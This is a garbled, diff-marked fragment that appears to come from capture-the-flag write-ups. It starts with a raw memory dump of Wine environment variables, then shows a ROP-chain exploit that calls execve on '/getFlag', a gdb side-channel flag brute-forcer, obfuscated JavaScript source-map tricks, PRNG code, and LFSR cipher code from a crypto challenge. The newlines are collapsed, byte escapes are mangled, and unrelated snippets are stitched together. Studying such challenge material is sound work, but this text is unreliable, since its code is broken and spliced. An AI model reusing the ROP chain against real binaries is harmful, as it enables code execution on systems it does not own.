IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
+x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00xb8x03x00x00USEx08 @x01x00x00x00x00x006@x01x00x00x00x00x00J@x01x00x00x00x00x00j@x01x00x00x00x00x00}@x01x00x00x00x00x00x95@x01x00x00x00x00x00xb2@x01x00x00x00x00x00xf9@x01x00x00x00x00x00x0cAx01x00x00x00x00x00$Ax01x00x00x00x00x00KAx01x00x00x00x00x00^Ax01x00x00x00x00x00kAx01x00x00x00x00x00x80Ax01x00x00x00x00x00xbbAx01x00x00x00x00x00xd6Ax01x00x00x00x00x00xeaAx01x00x00x00x00x00x02Bx01x00x00x00x00x00x10Bx01x00x00x00x00x00*Bx01x00x00x00x00x00DBx01x00x00x00x00x00zBx01x00x00x00x00x00x97Bx01x00x00x00x00x00xbcBx01x00x00x00x00x00xedBx01x00x00x00x00x00x00x00x00x00x00x00x00x00HOSTNAME=e7de35656151x00WINEDEBUG=fixme-allx00WINELOADER=/usr/lib/wine/wine64x00WINELOADERNOEXEC=1x00NUMBER_OF_PROCESSORS=16x00PROCESSOR_ARCHITECTURE=AMD64x00PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 80 Stepping 0, AuthenticAMDx00PROCESSOR_LEVEL=25x00PROCESSOR_REVISION=5000x00APPDATA=C:\users\user\Application Datax00CLIENTNAME=Consolex00HOMEDRIVE=C:
+x00HOMEPATH=\users\userx00LOCALAPPDATA=C:\users\user\Local Settings\Application Datax00LOGONSERVER=\\E7DE35656151x00SESSIONNAME=Consolex00USERDOMAIN=E7DE35656151x00USERNAME=userx00USERPROFILE=C:\users\userx00COMPUTERNAME=E7DE35656151x00WINEDATADIR=\??\Z:\usr\lib\wine\..\..\share\wine\winex00WINEHOMEDIR=\??\Z:\home\userx00WINECONFIGDIR=\??\Z:\home\user\.winex00WINEDLLDIR0=\??\Z:\usr\lib\x86_64-linux-gnu\winex00WINEUSERNAME=userx00x00x00x00x00x00x00x00x00x00x18x02x00x00USEx10Zx00:
+x00\x00bx00ax00bx00yx00-x00hx00ex00ax00px00-x00qx00ux00ex00sx00tx00ix00ox00nx00-x00mx00ax00rx00kx00.x00ex00xx00ex00x00x00=x00fx00ix00xx00mx00ex00-x00ax00lx00lx00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00=x00/x00ux00sx00rx00/x00lx00ix00bx00/x00wx00ix00nx00ex00/x00wx00ix00nx00ex006x004x00x00x00Wx00Ix00Nx00Ex00Lx00Ox00Ax00Dx00Ex00Rx00Nx00Ox00Ex00Xx00Ex00Cx00=x001x00x00x00Nx00Ux00Mx00Bx00Ex00Rx00_x00Ox00Fx00_x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00Sx00=x001x006x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ax00Rx00Cx00Hx00Ix00Tx00Ex00Cx00Tx00Ux00Rx00Ex00=x00Ax00Mx00Dx006x004x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Ix00Dx00Ex00Nx00Tx00Ix00Fx00Ix00Ex00Rx00=x00Ax00Mx00Dx006x004x00 x00Fx00ax00mx00ix00lx00yx00 x002x005x00 x00Mx00ox00dx00ex00lx00 x008x000x00 x00Sx00tx00ex00px00px00ix00nx00gx00 x000x00,x00 x00Ax00ux00tx00hx00ex00nx00tx00ix00cx00Ax00Mx00Dx00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Lx00Ex00Vx00Ex00Lx00=x002x005x00x00x00Px00Rx00Ox00Cx00Ex00Sx00Sx00Ox00Rx00_x00Rx00Ex00Vx00Ix00Sx00Ix00Ox00Nx00=x005x000x000x000x00x00x00Ax00Px00Px00Dx00Ax00Tx00Ax00=x00hx00x00x00USEx08'SYS_execve = 59
+add(3)edit(0, flat({0:
+dump_memory, 0xa10:
+p64(4) + p64(0x21fad8) + p64(4)}, filler=b'0'))edit(0, flat([    0x00000003af6b3fa9, 0,          # pop rdx; add eax, 0x7e0f6600; ret;    0x00000003af686040, SYS_execve, # pop rax; ret;    0x00000003af686177, 0x21fb20,   # pop rdi; ret;    0x00000003af68655a, 0,          # pop rsi; ret;    0x00000003af67bb76,             # syscall;    b'/getFlag0',                  # execve("/getFlag", NULL, NULL)]))
 sh.interactive()
-```
-
-
-
-```
 > file checkcheck: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b642c20c8b33d5ad6da327870a4840d6a70407e7, for GNU/Linux 3.2.0, stripped
-```
-
-
-
-```
 import sys
 PIE_BASE = 0x555555554000
 breakpoints = [0xec56] #CMP R12,qword ptr [RAX]
@@ -495,96 +498,30 @@ flag = ['_'] * 16index = 0
 while True:    if flag[index] != '_':        index = (index + 1) % 16        continue
     counts = []    for ch in 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-':        flag[index] = ch
         gdb.execute(f'starti "{"".join(flag)}"')
-        count = 0        while True:            try:                gdb.execute('c')            except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
+        count = 0        while True:            try:                gdb.execute('c')            
+except:                break            count += 1                sys.stderr.write(f'ATTEMPT FLAG:{"".join(flag)}, COUNT:{count}n')
         counts.append((count, ch))        flag[index] = '_'    if len(set(map(lambda x: x[0], counts))) != 1:        flag[index] = sorted(counts, key=lambda x: x[0], reverse=True)[0][1]        sys.stderr.write(f'CURRENT FLAG: {"".join(flag)}n')        index = (index + 1) % 16
-```
-
-
-
-```
-const b64 = AB...=;export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map
-```
-
-
-
-```
+const b64 = AB...=;
+export const go = async () => {    const bti = b64.trim().split("n").reduce((acc, x, i) => (acc.set(x, i), acc), new Map());    const upc = window.buffer.shift();    const moi = await fetch(import.meta.url).then((x) => x.text())    const tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())    const fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()]).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];    import(./${fl}).then((x) => x.go());}//# sourceMappingURL=0.js.map
 const fl = (heavily obfuscated code).filter(([_, x]) => x === upc).map(([x]) => x)?.[0] ?? tg.sources.slice(-2, -1)[0];
-```
-
-
-
-```
 for (let i = 0; i < 200; i++) {    let moi = await fetch(`./${i}.js`).then((x) => x.text())
     let tg = await fetch(moi.slice(moi.lastIndexOf("=") + 1)).then((x) => x.json())
     let fl = tg.mappings.split(";").flatMap((v, l) =>v.split(",").filter((x) => !!x).map((input) => input.split("").map((x) => bti.get(x)).reduce((acc, i) => (i & 32 ? [...acc.slice(0, -1), [...acc.slice(-1)[0], (i & 31)]] : [...acc.slice(0, -1), [[...acc.slice(-1)[0], i].reverse().reduce((acc, i) => (acc << 5) + i, 0)]].map((x) => typeof x === "number" ? x : x[0] & 0x1 ? (x[0] >>> 1) === 0 ? -0x80000000 : -(x[0] >>> 1) : (x[0] >>> 1)).concat([[]])), [[]]).slice(0, -1)).map(([c, s, ol, oc, n]) => [l,c,s??0,ol??0,oc??0,n??0]).reduce((acc, e, i) => [...acc, [l, e[1] + (acc[i - 1]?.[1]??0), ...e.slice(2)]], [])).reduce((acc, e, i) => [...acc, [...e.slice(0, 2), ...e.slice(2).map((x, c) => x + (acc[i - 1]?.[c + 2] ?? 0))]], []).map(([l, c, s, ol, oc, n], i, ls) => [tg.sources[s],moi.split("n").slice(l, ls[i+1] ? ls[i+1]?.[0] + 1 : undefined).map((x, ix, nl) => ix === 0 ? l === ls[i+1]?.[0] ? x.slice(c, ls[i+1]?.[1]) : x.slice(c) : ix === nl.length - 1 ? x.slice(0, ls[i+1]?.[1]) : x).join("n").trim()])
     if (fl.filter(([x, _]) => x === 'success.js').length > 0) {        console.log(fl)        console.log(i)        console.log(fl.filter(([x, _]) => x === 'success.js'))    }}
-```
-
-
-
-```
-background:url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');
-```
-
-
-
-```
-➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"><path fill="#fff" d="M0 0H200V540H0ZM2 62V78H198V62Z"/></svg>%
-```
-
-
-
-```
+background:
+url('data:
+image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+');
+➜  ~ echo "PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iNTQwIj48cGF0aCBmaWxsPSIjZmZmIiBkPSJNMCAwSDIwMFY1NDBIMFpNMiA2MlY3OEgxOThWNjJaIi8+PC9zdmc+" | base64 -d<svg xmlns="http://www.w3.org/2000/svg" width="200" height="540"></svg>%
 let tops = ['0px', '20px', '-380px', '-60px', '40px', '-20px', '-180px', '-80px', '-80px', '-80px', '-40px', '-60px', '-20px', '-240px', '-140px', '-100px', '-20px', '-20px', '-120px', '-160px', '-380px', '20px', '-20px', '-160px', '-200px', '-80px', '-60px', '-60px', '60px', '-140px', '-60px', '-240px', '60px', '-80px', '-180px', '-60px', '40px', '-60px', '-240px', '-60px', '-220px', '40px', '-260px', '0px', '-20px', '-60px', '-120px', '60px', '-240px', '40px', '-60px', '-20px', '40px', '-60px', '20px', '40px']
 for (let n = 0; n < 14; n++) {    let grandparent = document.children.item(0).children.item(1).children.item(0)    let parent = grandparent.children.item(8 + n)    let details = parent.children.item(6)    let done = false    for (let i = 0; i < 26; i++) {        details.children.item(i).open = false    }    for (let i = 0; i < 27; i++) {        for (let j = 26; j < 52; j++) {            details.children.item(j).open = false        }        for (let j = 26; j < 53; j++) {            for (let k = 52; k < 78; k++) {                details.children.item(k).open = false            }            for (let k = 52; k < 79; k++) {                if (window.getComputedStyle(details.children.item(78).children.item(0)).top == tops[n * 4 + 0] && window.getComputedStyle(details.children.item(79).children.item(0)).top == tops[n * 4 + 1] && window.getComputedStyle(details.children.item(80).children.item(0)).top == tops[n * 4 + 2] && window.getComputedStyle(details.children.item(81).children.item(0)).top == tops[n * 4 + 3]) {                    done = true                    break                }                if (k < 78) {                    details.children.item(k).open = true                }            }            if (done) {                break            }            if (j < 52) {                details.children.item(j).open = true            }        }        if (done) {            break        }        if (i < 26) {            details.children.item(i).open = true        }    }}
-```
-
-
-
-```
 static inline void XorShift128(uint64_t* state0, uint64_t* state1) {    uint64_t s1 = *state0;    uint64_t s0 = *state1;    *state0 = s0;    s1 ^= s1 << 23;    s1 ^= s1 >> 17;    s1 ^= s0;    s1 ^= s0 >> 26;    // s1 = (s1 &lt;< 23) ^ (s1 &gt;> 17) ^ s0 ^ (s0 >> 26)    *state1 = s1;  }
-```
-
-
-
-```
 bucket_map = {    0: '00',    1: '01',    2: '10',    3: '11'}
-```
-
-
-
-```
 bucket_map = {    0: '000', 1: '00', 2: '001',    3: '0', 4: '01', 5: '011',    6: '', 7: '100', 8: '10',    9: '1', 10: '110', 11: '11',    12: '111'}
-```
-
-
-
-```
 bucket_map = {    0: '000', 1: '00', 2: '0', 3: '01',    4: '', 5: '10', 6: '1', 7: '11',    8: '111'}
 noisy_bucket_map = {    0: '0', 1: '0', 2: '0', 3: '0',    4: '', 5: '', 6: '', 7: '',    8: '111'}
-```
-
-
-
-```
 bucket_map = {    0: '', 1: '', 2: '??1',    3: '?', 4: '?1', 5: '?11',    6: '', 7: '1', 8: '1',    9: '1',10: '11', 11: '11',    12: '111'}
-```
-
-
-
-```
 host_challenge = await self._read_or_fail(rw, 16)challenge_key = host_challenge[:8] # user controlledencrypted_host_nonce = host_challenge[8:] # user controlledcipher = Cipher(authentication_key, Mode.Authentication)host_mangling_key = cipher.encrypt(challenge_key)response = mangle(host_mangling_key, encrypted_host_nonce)await self._write(rw, response)
-```
-
-
-
-```
 sector_nonce = f.read(8)if len(sector_nonce) == 0:    breaksector_key = mangle(disk_key, sector_nonce)sector_cipher = Cipher(sector_key, Mode.Data)data = sector_cipher.decrypt(f.read(8208))await self._write(rw, stream_cipher.encrypt(data))
-```
-
-
-
-```
 class Cipher:    def __init__(self, key_bytes: bytes, mode: Mode):        # ...        key = int.from_bytes(key_bytes, "big")        key_1 = (key & 0xffffff0000000000) >> 40        key_2 = (key & 0x000000ffffffffff)        lfsr_seed_1 = ((key_1 & 0xfffff8) << 1) | 8 | (key_1 & 7)        lfsr_seed_2 = ((key_2 & 0xfffffffff8) << 1) | 8 | (key_2 & 7)        self.lfsr_1 = LFSR(25, lfsr_seed_1, 0x19e4001) # replaces lsfr-17        self.lfsr_2 = LFSR(41, lfsr_seed_2, 0xfdc0000001) # replaces lsfr-25    def _get_lfsr_byte(self) -> int:        byte_1 = self.lfsr_1.next_byte()        byte_2 = self.lfsr_2.next_byte()        # ...        result = byte_1 + byte_2 + self.carry        self.carry = (result >> 8) & 1        return result & 0xff
 ```
 
